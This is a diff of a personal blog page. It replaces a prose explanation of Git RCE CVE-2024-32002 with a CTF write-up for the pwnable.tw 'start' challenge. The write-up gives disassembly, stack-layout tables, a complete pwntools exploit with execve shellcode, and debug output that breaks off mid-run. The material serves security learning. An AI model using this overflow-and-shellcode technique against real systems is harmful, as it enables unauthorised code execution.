@@ -13,31 +13,25 @@
     
     <!--- Seo Part-->
     
-    <link rel="canonical" href="https://rogerjaytw.github.io/2024/11/13/git漏洞復現/"/>
+    <link rel="canonical" href="https://rogerjaytw.github.io/2025/02/05/pwnable-start-writeup/"/>
     <meta name="robots" content="index,follow">
     <meta name="googlebot" content="index,follow">
     <meta name="revisit-after" content="1 days">
     
-        <meta name="description" content="摘要 CVE編號：CVE-2024-32002  受影響系統：Windows,Mac Git影響版本:2.45.0, 2.44.0, &lt;&#x3D;2.43.3, &lt;&#x3D;2.42.1, 2.41.0, &lt;&#x3D;2.40.1, &lt;&#x3D;2.39.3 漏洞嚴重性：高（CVSS評分：9.1）  攻擊原理Git hookGit Hook是Git的機制，通常在Gi">
+        <meta name="description" content="題目出處https:&#x2F;&#x2F;pwnable.tw&#x2F;challenge&#x2F;#1  分析file123┌──(roger㉿kaliroger)-[~&#x2F;ctf&#x2F;pwnable&#x2F;start]└─$ file startstart: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), statically linked, not stripped c">
 <meta property="og:type" content="article">
-<meta property="og:title" content="Git漏洞復現，Clone一個項目就能RCE?!">
-<meta property="og:url" content="https://rogerjaytw.github.io/2024/11/13/Git%E6%BC%8F%E6%B4%9E%E5%BE%A9%E7%8F%BE/index.html">
+<meta property="og:title" content="Pwnable start writeup">
+<meta property="og:url" content="https://rogerjaytw.github.io/2025/02/05/Pwnable-start-writeup/index.html">
 <meta property="og:site_name" content="Hexo">
-<meta property="og:description" content="摘要 CVE編號：CVE-2024-32002  受影響系統：Windows,Mac Git影響版本:2.45.0, 2.44.0, &lt;&#x3D;2.43.3, &lt;&#x3D;2.42.1, 2.41.0, &lt;&#x3D;2.40.1, &lt;&#x3D;2.39.3 漏洞嚴重性：高（CVSS評分：9.1）  攻擊原理Git hookGit Hook是Git的機制，通常在Gi">
+<meta property="og:description" content="題目出處https:&#x2F;&#x2F;pwnable.tw&#x2F;challenge&#x2F;#1  分析file123┌──(roger㉿kaliroger)-[~&#x2F;ctf&#x2F;pwnable&#x2F;start]└─$ file startstart: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), statically linked, not stripped c">
 <meta property="og:locale" content="en_US">
-<meta property="og:image" content="https://rogerjaytw.github.io/images/Git%E6%BC%8F%E6%B4%9E/hooks.png">
-<meta property="og:image" content="https://rogerjaytw.github.io/images/Git%E6%BC%8F%E6%B4%9E/gitmodule.png">
-<meta property="og:image" content="https://rogerjaytw.github.io/images/Git%E6%BC%8F%E6%B4%9E/git.png">
-<meta property="og:image" content="https://rogerjaytw.github.io/images/Git%E6%BC%8F%E6%B4%9E/gitmodules.png">
-<meta property="og:image" content="https://rogerjaytw.github.io/images/Git%E6%BC%8F%E6%B4%9E/gitlist.png">
-<meta property="og:image" content="https://rogerjaytw.github.io/images/Git%E6%BC%8F%E6%B4%9E/tree.png">
-<meta property="article:published_time" content="2024-11-13T11:30:48.000Z">
-<meta property="article:modified_time" content="2024-11-14T03:54:20.028Z">
+<meta property="article:published_time" content="2025-02-05T07:29:58.000Z">
+<meta property="article:modified_time" content="2025-02-07T15:50:23.301Z">
 <meta property="article:author" content="John Doe">
-<meta property="article:tag" content="CVE">
-<meta property="article:tag" content="漏洞復現">
+<meta property="article:tag" content="Pwnable">
+<meta property="article:tag" content="CTF">
+<meta property="article:tag" content="writeup">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:image" content="https://rogerjaytw.github.io/images/Git%E6%BC%8F%E6%B4%9E/hooks.png">
     
     
     <!--- Icon Part-->
@@ -49,7 +43,7 @@
     
     <title>
         
-            Git漏洞復現，Clone一個項目就能RCE?! | Roger&#39;s Blog
+            Pwnable start writeup | Roger&#39;s Blog
         
     </title>
 
@@ -508,7 +502,7 @@
         <div class="article-title relative w-full">
             
                 <div class="w-full flex items-center pt-6 justify-start">
-                    <h1 class="article-title-regular text-second-text-color tracking-tight text-4xl md:text-6xl font-semibold px-2 sm:px-6 md:px-8 py-3">Git漏洞復現，Clone一個項目就能RCE?!</h1>
+                    <h1 class="article-title-regular text-second-text-color tracking-tight text-4xl md:text-6xl font-semibold px-2 sm:px-6 md:px-8 py-3">Pwnable start writeup</h1>
                 </div>
             
             </div>
@@ -529,15 +523,15 @@
                         <div class="article-meta-info">
     <span class="article-date article-meta-item">
         <i class="fa-regular fa-pen-fancy"></i>&nbsp;
-        <span class="desktop">2024-11-13 19:30:48</span>
-        <span class="mobile">2024-11-13 19:30:48</span>
+        <span class="desktop">2025-02-05 15:29:58</span>
+        <span class="mobile">2025-02-05 15:29:58</span>
         <span class="hover-info">Created</span>
     </span>
     
         <span class="article-date article-meta-item">
             <i class="fa-regular fa-wrench"></i>&nbsp;
-            <span class="desktop">2024-11-14 11:54:20</span>
-            <span class="mobile">2024-11-14 11:54:20</span>
+            <span class="desktop">2025-02-07 23:50:23</span>
+            <span class="mobile">2025-02-07 23:50:23</span>
             <span class="hover-info">Updated</span>
         </span>
     
@@ -549,11 +543,15 @@
             <ul>
                 
                     <li>
-                        <a href="/tags/CVE/">CVE</a>&nbsp;
+                        <a href="/tags/Pwnable/">Pwnable</a>&nbsp;
                     </li>
                 
                     <li>
-                        | <a href="/tags/%E6%BC%8F%E6%B4%9E%E5%BE%A9%E7%8F%BE/">漏洞復現</a>&nbsp;
+                        | <a href="/tags/CTF/">CTF</a>&nbsp;
+                    </li>
+                
+                    <li>
+                        | <a href="/tags/writeup/">writeup</a>&nbsp;
                     </li>
                 
             </ul>
@@ -579,91 +577,198 @@
 
 
         <div class="article-content markdown-body px-2 sm:px-6 md:px-8 pb-8">
-            <h2 id="摘要"><a href="#摘要" class="headerlink" title="摘要"></a>摘要</h2><ul>
-<li>CVE編號：CVE-2024-32002 </li>
-<li>受影響系統：Windows,Mac</li>
-<li>Git影響版本:2.45.0, 2.44.0, &lt;&#x3D;2.43.3, &lt;&#x3D;2.42.1, 2.41.0, &lt;&#x3D;2.40.1, &lt;&#x3D;2.39.3</li>
-<li>漏洞嚴重性：高（CVSS評分：9.1）</li>
-</ul>
-<h2 id="攻擊原理"><a href="#攻擊原理" class="headerlink" title="攻擊原理"></a>攻擊原理</h2><h3 id="Git-hook"><a href="#Git-hook" class="headerlink" title="Git hook"></a>Git hook</h3><p>Git Hook是Git的機制，通常在<code>Git Clone</code>一個項目或是將本地的倉庫初始化<code>git init</code>後，”本地”的git客戶端都會生成一個.git目錄，這些Hook文件存在<code>.git/hooks/</code>目錄當中(附圖⤵️)<br><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="/../images/Git%E6%BC%8F%E6%B4%9E/hooks.png"
-                      alt="hooks"
-                ><br>Git Hook允許開發者在特定的Git操作發生時自動執行腳本或命令，其中又有分成Client-Side Hooks和Server-Side Hooks </p>
-<br>
+            <h2 id="題目出處"><a href="#題目出處" class="headerlink" title="題目出處"></a>題目出處</h2><p><a class="link"   target="_blank" rel="noopener" href="https://pwnable.tw/challenge/#1" >https://pwnable.tw/challenge/#1 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
+<h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><h3 id="file"><a href="#file" class="headerlink" title="file"></a>file</h3><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">┌──(roger㉿kaliroger)-[~/ctf/pwnable/start]</span><br><span class="line">└─$ file start</span><br><span class="line">start: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), statically linked, not stripped</span><br></pre></td></tr></table></figure></div>
+<h3 id="checksec"><a href="#checksec" class="headerlink" title="checksec"></a>checksec</h3><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">┌──(roger㉿kaliroger)-[~/ctf/pwnable/start]</span><br><span class="line">└─$ checksec --file=start</span><br><span class="line">RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH	Symbols		FORTIFY	Fortified	Fortifiable	FILE</span><br><span class="line">No RELRO        No canary found   NX disabled   No PIE          No RPATH   No RUNPATH   8 Symbols	  No	0		0		start</span><br></pre></td></tr></table></figure></div>
 
-<p>Client-Side Hooks <br></p>
-<ul>
-<li>pre-commit:在執行<code>git commit</code>前觸發，可用於檢查程式格式、運行測試等等……。</li>
-<li>prepare-commit-msg:在提交訊息編輯完成後觸發，用於檢查格式</li>
-<li>pre-push：在執行<code>git push</code>操作之前觸發，可以進行測試、檢查或確認操作。</li>
-<li>post-commit：在成功執行<code>git commit</code>後觸發，用於執行一些後續的操作，比如發送通知。</li>
-</ul>
-<br>
+<h3 id="IDA"><a href="#IDA" class="headerlink" title="IDA"></a>IDA</h3><h4 id="start"><a href="#start" class="headerlink" title="start()"></a>start()</h4><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">.text:08048060                 public _start</span><br><span class="line">.text:08048060 _start          proc near               ; DATA XREF: LOAD:08048018↑o</span><br><span class="line">.text:08048060                 push    esp</span><br><span class="line">.text:08048061                 push    offset _exit</span><br><span class="line">.text:08048066                 xor     eax, eax</span><br><span class="line">.text:08048068                 xor     ebx, ebx</span><br><span class="line">.text:0804806A                 xor     ecx, ecx</span><br><span class="line">.text:0804806C                 xor     edx, edx</span><br><span class="line">.text:0804806E                 push    3A465443h</span><br><span class="line">.text:08048073                 push    20656874h</span><br><span class="line">.text:08048078                 push    20747261h</span><br><span class="line">.text:0804807D                 push    74732073h</span><br><span class="line">.text:08048082                 push    2774654Ch</span><br><span class="line">.text:08048087                 mov     ecx, esp        ; addr</span><br><span class="line">.text:08048089                 mov     dl, 14h</span><br><span class="line">.text:0804808B                 mov     bl, 1           ; fd</span><br><span class="line">.text:0804808D                 mov     al, 4</span><br><span class="line">.text:0804808F                 int     80h             ; LINUX - sys_write</span><br><span class="line">.text:08048091                 xor     ebx, ebx</span><br><span class="line">.text:08048093                 mov     dl, 3Ch ; &#x27;&lt;&#x27;</span><br><span class="line">.text:08048095                 mov     al, 3</span><br><span class="line">.text:08048097                 int     80h             ; LINUX -</span><br><span class="line">.text:08048099                 add     esp, 14h</span><br><span class="line">.text:0804809C                 retn</span><br></pre></td></tr></table></figure></div>
+<h4 id="exit"><a href="#exit" class="headerlink" title="_exit()"></a>_exit()</h4><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">.text:0804809D _exit           proc near               ; DATA XREF: _start+1↑o</span><br><span class="line">.text:0804809D                 pop     esp</span><br><span class="line">.text:0804809E                 xor     eax, eax</span><br><span class="line">.text:080480A0                 inc     eax</span><br><span class="line">.text:080480A1                 int     80h             ; LINUX - sys_exit</span><br></pre></td></tr></table></figure></div>
 
-<p>Server-Side Hooks <br></p>
-<ul>
-<li>pre-receive：在伺服器接收到推送時觸發，用於檢查推送的內容是否符合要求。</li>
-<li>post-receive：在推送完成後觸發，可以用來自動部署代碼或通知相關人員。</li>
-<li>update：在推送到特定分支時觸發，通常用於更細粒度的檢查，例如限制某些分支的推送。</li>
-</ul>
-<p>.git目錄的內容是由git程序自主維護，不會被Git項目的內容影響，當上傳項目時.git目錄也不會被傳到服務器上，所以正常情況從服務器clone一個項目只是把項目內容拉到本地，不會有惡意的Hook腳本(除非你手動將腳本拉到裡面)。</p>
-<p>這是的攻擊手法是利用Git子模塊的特性將攻擊腳本寫入.git目錄裡</p>
-<h3 id="Git-子模塊-Submodule"><a href="#Git-子模塊-Submodule" class="headerlink" title="Git 子模塊(Submodule)"></a>Git 子模塊(Submodule)</h3><p>Git子模塊是Git的一個特性，可以將一個Git項目作為另一個Git項目的子目錄，可以在一個項目中包含其他項目，例如一個開源項目中包含另一個開源項目，主項目下面會有一個.gitmodules文件，裡面記錄了子模塊的相關信息(如下圖⤵️)<br><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="/../images/Git%E6%BC%8F%E6%B4%9E/gitmodule.png"
-                      alt="gitmodules"
-                ><br>path: 子模塊的路徑 &#x2F; url: 子模塊的git項目地址</p>
-<p>如果我們在進行<code>git clone</code>時加上<code>--recursive</code>參數，Git會自動初始化子模塊，並將子模塊的內容遞歸的拉到本地，這時候子模塊的.git目錄也會被拉到本地，並放入對應的文件目錄位址，不僅主項目會有一個.git目錄，子模塊也會有一個.git目錄，不過這個.git目錄是空的，只有一個文件<code>.git</code>，裡面對應了這個子模塊真正的.git目錄的位址(如下圖⤵️)</p>
-<p><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="/../images/Git%E6%BC%8F%E6%B4%9E/git.png"
-                      alt="submodule"
-                ></p>
-<blockquote>
-<p>sha1collisiondetection是子項目</p>
-</blockquote>
-<h3 id="Git-符號連結-symbolic-link"><a href="#Git-符號連結-symbolic-link" class="headerlink" title="Git 符號連結 (symbolic link)"></a>Git 符號連結 (symbolic link)</h3><p>Git符號連結是文件系統的特性，允許一個文件或目錄指向另一個文件或目錄，本身不包含文件內容，而是包含指向目標文件或目錄的路徑，當訪問符號連結時，系統會自動轉向目標文件或目錄，就像快捷方式一樣。</p>
-<h2 id="漏洞成因"><a href="#漏洞成因" class="headerlink" title="漏洞成因"></a>漏洞成因</h2><p>前面有提到Hook腳本本身與項目內容無關，除非是手動放置腳本到hooks目錄中，否則項目中的內容是不會跑到.git目錄裡。</p>
-<br>
+<h5 id="一段一段解讀"><a href="#一段一段解讀" class="headerlink" title="一段一段解讀"></a>一段一段解讀</h5><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">.text:08048060                 push    esp</span><br><span class="line">.text:08048061                 push    offset _exit</span><br><span class="line">把esp和_exit的offset(0x0804809D)推進stack裡</span><br></pre></td></tr></table></figure></div>
 
-<p>攻擊者製作了一個Git項目，在這個項目中又包含了一個子模塊，<br>當使用<code>--recursive</code>參數clone這個項目時，就會遞歸的去拉取項目放到對應的位置，下圖為該項目的.gitmodules文件<br><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="/../images/Git%E6%BC%8F%E6%B4%9E/gitmodules.png"
-                      alt="gitmodules"
-                ><br>圖片中可以看到，他指示Git把url中的項目放到<code>A/modules/x</code>目錄中，然後在這個項目下，有一個名叫<code>a</code>的符號連結，並且指向.git目錄(如下圖⤵️)</p>
-<p><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="/../images/Git%E6%BC%8F%E6%B4%9E/gitlist.png"
-                      alt="list"
-                ></p>
-<p>由於Windows和Mac的文件和目錄名稱是大小寫不敏感，導致在放到<code>A/modules/x</code>實際上就是放到<code>.git/modules/x</code>，前面提過這個目錄是歸子模塊所屬的.git目錄，還按照原本的.git目錄結構，裡面有一個<code>hooks</code>目錄，這時候就會把攻擊者的Hook腳本放到這個目錄中，當你執行下個<code>git clone</code>時，就會執行這個腳本，這樣就可以達到RCE的目的，以下展示整個目錄的結構<br><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="/../images/Git%E6%BC%8F%E6%B4%9E/tree.png"
-                      alt="tree"
-                ></p>
-<h2 id="漏洞復現"><a href="#漏洞復現" class="headerlink" title="漏洞復現"></a>漏洞復現</h2><blockquote>
-<p>Mac Air M3 , git version 2.39.3</p>
-</blockquote>
-<div style="position: relative; width: 100%; height: 0; padding-bottom: 56.25%;">
-    <iframe src="https://www.youtube.com/embed/YrtU-i7FIZw?si=wnlPKFFTcmsisPDT" title="YouTube video player" style="position: absolute; width: 100%; height: 100%; top: 0; left: 0; border: 0;" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share" referrerpolicy="strict-origin-when-cross-origin" allowfullscreen></iframe>
-</div>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">.text:08048066                 xor     eax, eax</span><br><span class="line">.text:08048068                 xor     ebx, ebx</span><br><span class="line">.text:0804806A                 xor     ecx, ecx</span><br><span class="line">.text:0804806C                 xor     edx, edx</span><br><span class="line">初始化 eax, ebx, ecx, edx</span><br></pre></td></tr></table></figure></div>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">.text:0804806E                 push    3A465443h &quot;CTF:&quot;</span><br><span class="line">.text:08048073                 push    20656874h &quot;the &quot;</span><br><span class="line">.text:08048078                 push    20747261h &quot;art &quot;</span><br><span class="line">.text:0804807D                 push    74732073h &quot;s st&quot;</span><br><span class="line">.text:08048082                 push    2774654Ch &quot;Let&#x27;&quot;</span><br><span class="line">把 &quot;Let&#x27;s start the CTF:&quot; 這段字串推進stack裡</span><br><span class="line">因為x86是小端序（little-endian），所以字元順序是反的</span><br></pre></td></tr></table></figure></div>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">.text:08048087                 mov     ecx, esp        ; addr</span><br><span class="line">.text:08048089                 mov     dl, 14h</span><br><span class="line">.text:0804808B                 mov     bl, 1           ; fd</span><br><span class="line">.text:0804808D                 mov     al, 4</span><br><span class="line">.text:0804808F                 int     80h             ; LINUX - sys_write</span><br><span class="line">write(fd = 1, *buf = esp, count = 0x14)</span><br></pre></td></tr></table></figure></div>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">.text:08048091                 xor     ebx, ebx</span><br><span class="line">.text:08048093                 mov     dl, 3Ch ; &#x27;&lt;&#x27;</span><br><span class="line">.text:08048095                 mov     al, 3</span><br><span class="line">.text:08048097                 int     80h             ; LINUX -</span><br><span class="line">read(fd = 1, *buf = esp, count = 0x3c)</span><br></pre></td></tr></table></figure></div>
 
+<h2 id="解題思路"><a href="#解題思路" class="headerlink" title="解題思路"></a>解題思路</h2><p>read()會讀取<code>0x3c</code>個字元到esp，可利用這個特點實現bof，注意payload大小不能超過<code>0x3c</code>個字元</p>
+<p>當read()時，stack狀況</p>
+<table>
+<thead>
+<tr>
+<th align="center">地址</th>
+<th align="center">數值</th>
+<th align="center">備注</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="center">x-28</td>
+<td align="center">0x2774654c</td>
+<td align="center">Let’ , esp指在這</td>
+</tr>
+<tr>
+<td align="center">x-24</td>
+<td align="center">0x74732073</td>
+<td align="center">s st</td>
+</tr>
+<tr>
+<td align="center">x-20</td>
+<td align="center">0x20747261</td>
+<td align="center">art</td>
+</tr>
+<tr>
+<td align="center">x-16</td>
+<td align="center">0x20656874</td>
+<td align="center">the</td>
+</tr>
+<tr>
+<td align="center">x-12</td>
+<td align="center">0x3a465443</td>
+<td align="center">CTF:</td>
+</tr>
+<tr>
+<td align="center">x-8</td>
+<td align="center">0x804809d</td>
+<td align="center">_exit()的地址</td>
+</tr>
+<tr>
+<td align="center">x-4</td>
+<td align="center">esp地址&#x3D;x</td>
+<td align="center">一開始推進來的地址</td>
+</tr>
+</tbody></table>
+<p>即便沒有開任何保護，stack的地址不是固定的，所以需要先leak stack的地址，才有辦法ret2sc，這裡可以利用<code>write()</code>來leak stack的地址，payload為0x14個字元+write()地址，蓋完後stack的狀態會變成</p>
+<table>
+<thead>
+<tr>
+<th align="center">地址</th>
+<th align="center">數值</th>
+<th align="center">備注</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="center">x-28</td>
+<td align="center">0x2774654c ➡️ AAAA</td>
+<td align="center">Let’</td>
+</tr>
+<tr>
+<td align="center">x-24</td>
+<td align="center">0x74732073 ➡️ AAAA</td>
+<td align="center">s st</td>
+</tr>
+<tr>
+<td align="center">x-20</td>
+<td align="center">0x20747261 ➡️ AAAA</td>
+<td align="center">art</td>
+</tr>
+<tr>
+<td align="center">x-16</td>
+<td align="center">0x20656874 ➡️ AAAA</td>
+<td align="center">the</td>
+</tr>
+<tr>
+<td align="center">x-12</td>
+<td align="center">0x3a465443 ➡️ AAAA</td>
+<td align="center">CTF:</td>
+</tr>
+<tr>
+<td align="center">x-8</td>
+<td align="center">0x804809d ➡️ 0x8048087</td>
+<td align="center">變成write()的地址</td>
+</tr>
+<tr>
+<td align="center">x-4</td>
+<td align="center">esp地址</td>
+<td align="center">retn後esp,ecx會指在這</td>
+</tr>
+</tbody></table>
+<p>leak出來的地址&#x3D;x</p>
+<p>執行第二次read()時，就和第一次一樣，把ret改成shellcode的地址，這樣就可以拿到shell了，payload就是0x14個字元+(esp+4地址+0x14)+shellcode</p>
+<p>stack的狀態會變成</p>
+<table>
+<thead>
+<tr>
+<th align="center">地址</th>
+<th align="center">數值</th>
+<th align="center">備注</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="center">x-28</td>
+<td align="center">0x2774654c ➡️ AAAA</td>
+<td align="center">Let’</td>
+</tr>
+<tr>
+<td align="center">x-24</td>
+<td align="center">0x74732073 ➡️ AAAA</td>
+<td align="center">s st</td>
+</tr>
+<tr>
+<td align="center">x-20</td>
+<td align="center">0x20747261 ➡️ AAAA</td>
+<td align="center">art</td>
+</tr>
+<tr>
+<td align="center">x-16</td>
+<td align="center">0x20656874 ➡️ AAAA</td>
+<td align="center">the</td>
+</tr>
+<tr>
+<td align="center">x-12</td>
+<td align="center">0x3a465443 ➡️ AAAA</td>
+<td align="center">CTF:</td>
+</tr>
+<tr>
+<td align="center">x-8</td>
+<td align="center">0x804809d ➡️ 0x8048087</td>
+<td align="center">變成write()的地址</td>
+</tr>
+<tr>
+<td align="center">x-4</td>
+<td align="center">esp地址 ➡️ BBBB</td>
+<td align="center">第二次read()開始</td>
+</tr>
+<tr>
+<td align="center">x</td>
+<td align="center">? ➡️ BBBB</td>
+<td align="center"></td>
+</tr>
+<tr>
+<td align="center">x+4</td>
+<td align="center">? ➡️ BBBB</td>
+<td align="center"></td>
+</tr>
+<tr>
+<td align="center">x+8</td>
+<td align="center">? ➡️ BBBB</td>
+<td align="center"></td>
+</tr>
+<tr>
+<td align="center">x+12</td>
+<td align="center">? ➡️ BBBB</td>
+<td align="center"></td>
+</tr>
+<tr>
+<td align="center">x+16</td>
+<td align="center">x+20</td>
+<td align="center">shellcode的地址</td>
+</tr>
+<tr>
+<td align="center">x+20</td>
+<td align="center">shellcode</td>
+<td align="center"></td>
+</tr>
+</tbody></table>
+<h2 id="Exploit"><a href="#Exploit" class="headerlink" title="Exploit"></a>Exploit</h2><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3.11</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.arch = <span class="string">&#x27;i386&#x27;</span></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"><span class="comment">#context.terminal = [&quot;tmux&quot;, &quot;splitw&quot;, &quot;-h&quot;]</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#nc chall.pwnable.tw 10000</span></span><br><span class="line">r = remote(<span class="string">&quot;chall.pwnable.tw&quot;</span>, <span class="number">10000</span>)</span><br><span class="line"><span class="comment">#r = process(&quot;./start&quot;)</span></span><br><span class="line"><span class="comment">#elf = ELF(&quot;./start&quot;)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#gdb.attach(r)</span></span><br><span class="line"></span><br><span class="line">shellcode = <span class="string">b&quot;\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#0x08048087 : write()</span></span><br><span class="line">payload1 = <span class="string">b&#x27;A&#x27;</span>*<span class="number">0x14</span> + p32(<span class="number">0x08048087</span>)</span><br><span class="line">r.sendafter(<span class="string">b&#x27;:&#x27;</span>,payload1)</span><br><span class="line">esp = u32(r.recv(<span class="number">4</span>))</span><br><span class="line">r.recv()</span><br><span class="line">log.success(<span class="built_in">hex</span>(esp))</span><br><span class="line">payload2 = <span class="string">b&quot;B&quot;</span>*(<span class="number">0x14</span>) + p32(esp+<span class="number">0x14</span>) + shellcode</span><br><span class="line">r.send(payload2)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure></div>
 
-<p>只要能彈出計算機就代表RCE成功了</p>
-<p>想自己試試看的可以參考這個<a class="link"   target="_blank" rel="noopener" href="https://github.com/amalmurali47/git_rce" >repo <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
-<h2 id="結論"><a href="#結論" class="headerlink" title="結論"></a>結論</h2><ul>
-<li>平時還是要做好更新的習慣，及時更新Git版本</li>
-<li>不要隨便clone不明來源的項目，尤其是有子模塊的項目</li>
-</ul>
-<h2 id="參考資料"><a href="#參考資料" class="headerlink" title="參考資料"></a>參考資料</h2><p>Git_rce:<a class="link"   target="_blank" rel="noopener" href="https://github.com/amalmurali47/git_rce" >https://github.com/amalmurali47/git_rce <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a><br>NVD:<a class="link"   target="_blank" rel="noopener" href="https://nvd.nist.gov/vuln/detail/cve-2024-32002" >https://nvd.nist.gov/vuln/detail/cve-2024-32002 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a><br>git hook:<a class="link"   target="_blank" rel="noopener" href="https://git-scm.com/book/zh-tw/v2/Customizing-Git-Git-Hooks" >https://git-scm.com/book/zh-tw/v2/Customizing-Git-Git-Hooks <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
-<p>這是期中考完後的一個小研究，希望大家能夠了解這個漏洞的成因，並且在日常使用Git時能夠注意這些細節，避免被攻擊者利用這個漏洞進行攻擊，別做壞事，要當個好駭客。</p>
+<p>結果展示:</p>
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">┌──(roger㉿kaliroger)-[~/ctf/pwnable/start]</span><br><span class="line">└─$ ./exp.py</span><br><span class="line">[+] Opening connection to chall.pwnable.tw on port 10000: Done</span><br><span class="line">[DEBUG] Received 0x14 bytes:</span><br><span class="line">    b<span class="string">&quot;Let&#x27;s start the CTF:&quot;</span></span><br><span class="line">[DEBUG] Sent 0x18 bytes:</span><br><span class="line">    00000000  41 41 41 41  41 41 41 41  41 41 41 41  41 41 41 41  │AAAA│AAAA│AAAA│AAAA│</span><br><span class="line">    00000010  41 41 41 41  87 80 04 08                            │AAAA│····│</span><br><span class="line">    00000018</span><br><span class="line">[DEBUG] Received 0x14 bytes:</span><br><span class="line">    00000000  60 44 c1 ff  01 00 00 00  35 4f c1 ff  00 00 00 00  │`D··│····│5O··│····│</span><br><span class="line">    00000010  47 4f c1 ff                                         │GO··│</span><br><span class="line">    00000014</span><br><span class="line">[+] 